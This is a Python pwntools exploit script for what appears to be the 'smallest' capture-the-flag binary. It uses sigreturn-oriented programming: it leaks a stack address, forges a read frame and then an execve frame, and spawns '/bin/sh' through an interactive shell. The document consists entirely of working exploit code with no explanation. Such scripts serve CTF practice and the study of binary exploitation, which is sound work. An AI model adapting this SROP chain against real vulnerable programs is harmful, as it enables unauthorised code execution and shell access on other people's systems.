#Made by fly_autumn
#SROP x64 smallest pwn
from pwn import *
p = process("./smallest")
elf = ELF("./smallest")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context(os="linux" , arch="amd64")

start_plt = 0x4000b0
syscall_ret = 0x4000be

payload = p64(start_plt)*3
p.sendline(payload)
p.send("\xb3")
stack_addr = u64(p.recv()[8:16])
log.success("stack_addr: "+hex(stack_addr))

sigframe1 = SigreturnFrame()
sigframe1.rax = constants.SYS_read
sigframe1.rdi = 0
sigframe1.rsi = stack_addr
sigframe1.rdx = 0x400
sigframe1.rsp = stack_addr
sigframe1.rip = syscall_ret
payload = p64(start_plt) + b"a"*8 + bytes(sigframe1)
p.send(payload)

sigreturn = p64(syscall_ret)+b"b"*7
p.send(sigreturn)

sigframe2 = SigreturnFrame()
sigframe2.rax = constants.SYS_execve
sigframe2.rdi = stack_addr + 0x120
sigframe2.rsi = 0x0
sigframe2.rdx = 0x0
sigframe2.rsp = stack_addr
sigframe2.rip = syscall_ret
sigpayload = p64(start_plt) + b"aaaaaaaa" + bytes(sigframe2)
print(len(sigpayload))
payload = sigpayload + (0x120-len(sigpayload)) * b"\x00" + b"/bin/sh\x00"
p.send(payload)
p.send(sigreturn)

p.interactive()
